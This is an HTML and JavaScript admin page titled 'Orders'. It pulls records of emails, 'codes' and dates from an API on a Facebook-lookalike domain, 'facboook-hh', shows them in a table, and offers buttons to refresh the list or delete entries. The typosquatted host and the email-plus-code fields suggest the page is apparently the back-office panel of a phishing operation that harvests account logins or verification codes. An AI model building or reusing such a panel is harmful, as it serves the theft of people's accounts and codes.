<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Orders</title>

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }

        body {
            min-height: 100vh;
            background: #e9eef0;
            padding: 40px;
            color: #202b31;
        }

        .container {
            max-width: 1000px;
            margin: auto;
        }

        .top {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
        }

        h1 {
            font-size: 28px;
        }

        .subtitle {
            color: #7d878b;
            font-size: 12px;
            margin-top: 5px;
        }

        .refresh {
            border: none;
            padding: 12px 20px;
            border-radius: 10px;
            background: #e9eef0;
            color: #1877f2;
            cursor: pointer;
            box-shadow:
                6px 6px 12px rgba(160,170,175,.4),
                -6px -6px 12px rgba(255,255,255,.9);
        }

        .card {
            background: #e9eef0;
            padding: 25px;
            border-radius: 18px;
            box-shadow:
                10px 10px 25px rgba(160,170,175,.4),
                -10px -10px 25px rgba(255,255,255,.9);
        }

        .total {
            margin-bottom: 20px;
            color: #707a7e;
        }

        .table-box {
            overflow-x: auto;
        }

        table {
            width: 100%;
            border-collapse: collapse;
        }

        th,
        td {
            padding: 14px 10px;
            text-align: left;
            font-size: 12px;
        }

        th {
            color: #1877f2;
        }

        tr {
            border-bottom: 1px solid rgba(160,170,175,.25);
        }

        .delete {
            border: none;
            border-radius: 7px;
            padding: 7px 12px;
            background: #e9eef0;
            color: #d33;
            cursor: pointer;
            box-shadow:
                3px 3px 7px rgba(160,170,175,.3),
                -3px -3px 7px rgba(255,255,255,.8);
        }

        .delete:hover {
            background: #dde3e5;
        }

        #status {
            margin-top: 15px;
            color: #7d878b;
            font-size: 11px;
        }
    </style>
</head>

<body>

<div class="container">

    <div class="top">
        <div>
            <h1>Orders</h1>
            <p class="subtitle">View submitted orders</p>
        </div>

        <button class="refresh" onclick="loadOrders()">
            Refresh
        </button>
    </div>

    <div class="card">

        <div class="total">
            Total Orders:
            <strong id="totalOrders">0</strong>
        </div>

        <div class="table-box">
            <table>
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>Email</th>
                        <th>Code</th>
                        <th>Date</th>
                        <th>Action</th>
                    </tr>
                </thead>

                <tbody id="ordersBody">
                </tbody>
            </table>
        </div>

        <p id="status">Connecting to server...</p>

    </div>

</div>

<script>
const API_URL = "https://facboook-hh.onrender.com";

async function loadOrders() {
    const ordersBody = document.getElementById("ordersBody");
    const totalOrders = document.getElementById("totalOrders");
    const status = document.getElementById("status");

    try {
        status.textContent = "Connecting to server...";

        const response = await fetch(API_URL + "/orders");

        if (!response.ok) {
            throw new Error("Server error");
        }

        const orders = await response.json();

        ordersBody.innerHTML = "";
        totalOrders.textContent = orders.length;

        if (orders.length === 0) {
            ordersBody.innerHTML = `
                <tr>
                    <td colspan="5">No orders yet.</td>
                </tr>
            `;

            status.textContent = "Connected";
            return;
        }

        orders.forEach(function(order) {
            const row = document.createElement("tr");

            row.innerHTML = `
                <td>${order.id}</td>
                <td>${escapeHTML(order.email)}</td>
                <td>${escapeHTML(order.code)}</td>
                <td>${escapeHTML(order.date)}</td>
                <td>
                    <button class="delete" onclick="deleteOrder(${order.id})">
                        Delete
                    </button>
                </td>
            `;

            ordersBody.appendChild(row);
        });

        status.textContent = "Connected";

    } catch (error) {
        console.error(error);
        status.textContent = "Could not connect to server";
    }
}

async function deleteOrder(id) {

    const confirmed = confirm("Are you sure you want to delete this order?");

    if (!confirmed) {
        return;
    }

    try {
        const response = await fetch(
            API_URL + "/orders/" + id,
            {
                method: "DELETE"
            }
        );

        if (!response.ok) {
            throw new Error("Delete failed");
        }

        await loadOrders();

    } catch (error) {
        console.error(error);
        alert("Could not delete order.");
    }
}

function escapeHTML(value) {
    const div = document.createElement("div");
    div.textContent = value || "";
    return div.innerHTML;
}

loadOrders();
</script>

</body>
</html>
